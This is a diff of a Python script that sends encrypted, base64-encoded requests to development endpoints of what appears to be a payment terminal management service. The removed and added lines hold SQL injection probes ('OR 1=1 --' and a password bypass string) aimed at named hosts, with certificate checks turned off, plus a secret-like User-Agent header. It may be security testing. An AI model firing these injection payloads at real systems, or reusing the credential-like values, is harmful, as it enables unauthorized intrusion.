@@ -41,17 +41,10 @@ if __name__ == '__main__':
     ret = enc.encrypt(data)
     print(base64.b64encode(ret))
     
-    headers = {'IV': iv, 'SN':sn, 'Sver': '3000', 'Chgsn': '082306605710118', 'User-Agent': 'd&rCGr!%y9+A$LI4pSoG_$3dJUE39+H&=AG/ak*rxL$TqgQHO+-1bKSCalkBe4OB'}
     # POST with header
-    url = 'https://dev-tms-v2.paytg.jp/updater/checkUpdate'
-    #url = 'https://dev-tms-v2.paytg.jp/updater/checkUpdate?username=admin&password=password%27%20OR%20%271%27=%271'
-    #url = 'https://dev-tms-v2.paytg.jp:10443/css/font/ficon.woff?206623=+AND+1%3D1+--+'
-    #url = 'https://dev-tms-v2.paytg.jp:10443/css/font/ficon.woff?206623=+OR+1%3D1+--+'
-    #url = 'https://dev-tms-v2.paytg.jp:10443/css/font/ficon.woff'
-    r = requests.post(url, 
-        data=base64.b64encode(ret),
-        headers=headers, verify=False)
-    #r = requests.get(url, verify=False)
+    #url = 'https://paytg-dev-nlb-c3c06871f9f770a9.elb.ap-northeast-1.amazonaws.com:10443/css/font/ficon.woff?206623=+AND+1%3D1+--+'
+    url = 'https://paytg-dev-nlb-c3c06871f9f770a9.elb.ap-northeast-1.amazonaws.com:10443/css/font/ficon.woff?206623=+OR+1%3D1+--+'
+    r = requests.get(url, verify=False)
     print(r.status_code)
     print(r.text)
     print(r.headers)
